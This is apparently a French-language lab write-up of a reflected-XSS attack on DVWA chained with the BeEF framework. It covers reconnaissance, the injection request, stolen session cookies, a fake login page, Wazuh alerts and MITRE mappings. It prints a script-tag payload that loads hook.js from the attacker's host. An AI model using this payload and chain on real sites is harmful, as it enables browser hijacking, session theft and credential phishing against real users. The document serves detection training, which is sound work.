# Scénario d'Attaque — Chain XSS + BeEF

> **Contexte** : Description de la chaîne d'attaque, de la reconnaissance à la compromission.

---

## 1. Reconnaissance

L'attaquant (Kali, `192.168.56.10`) identifie la cible `debian-web-01` (`192.168.56.20`) qui héberge DVWA via Docker.

**Actions** :
- Scan réseau : `nmap -sV 192.168.56.20`
- Service identifié : Apache 2.4.25 sur port 80
- Application : DVWA avec module XSS (Reflected) non protégé

---

## 2. Identification de la Faille

Le module XSS (Reflected) accepte une entrée dans `name` et la renvoie **sans échappement** dans le HTML.

**Test** :
```html
<script>alert(1)</script>
```

**Résultat** : la popup s'exécute → **faille confirmée**.

---

## 3. Weaponisation

L'attaquant prépare son payload BeEF :

```html
<script src="http://192.168.56.10:3000/hook.js"></script>
```

**Fonctionnement** :
1. Le navigateur charge `hook.js` depuis BeEF
2. Le script s'exécute dans le contexte du navigateur
3. Il enregistre le navigateur via des callbacks réguliers
4. BeEF peut envoyer des modules à distance

---

## 4. Exploitation

L'attaquant injecte le payload dans DVWA.

**Requête HTTP** :
```http
GET /vulnerabilities/xss_r/?name=<script src="http://192.168.56.10:3000/hook.js"></script> HTTP/1.1
Host: 192.168.56.20
```

**Réponse** : `HTTP/1.1 200 OK` → attaque réussie.

---

## 5. Post-Exploitation

Le navigateur apparaît dans **Hooked Browsers** de BeEF.

**Informations extraites** :

| Champ | Valeur |
|---|---|
| browser.name | Firefox |
| browser.version | 140.0 |
| browser.platform | Linux x86_64 |
| browser.window.cookies | `PHPSESSID=...; security=low` |

**Modules exécutés** :
- **Get Cookie** → extraction du cookie de session
- **Pretty Theft** → fausse page de login
- **Fake Notification Bar** → fausse notification

---

## 6. Impact

| Élément | Valeur |
|---|---|
| Système compromis | `debian-web-01` |
| Session volée | `PHPSESSID` |
| Contrôle | Navigateur sous contrôle |
| Sévérité | **CRITIQUE** (niveau 12) |

---

## 7. Télémétrie Générée

| Source | Élément |
|---|---|
| Logs Apache | Requête GET avec payload |
| Wazuh | Alerte niveau 12 (règle 100100) |
| BeEF | Navigateur hooké |
| Réseau | Trafic HTTP/WebSocket |

---

## 8. Références MITRE ATT&CK

| Technique | ID |
|---|---|
| Browser Session Hijacking | T1185 |
| JavaScript/JScript | T1059.007 |
| Exploit Public-Facing Application | T1190 |
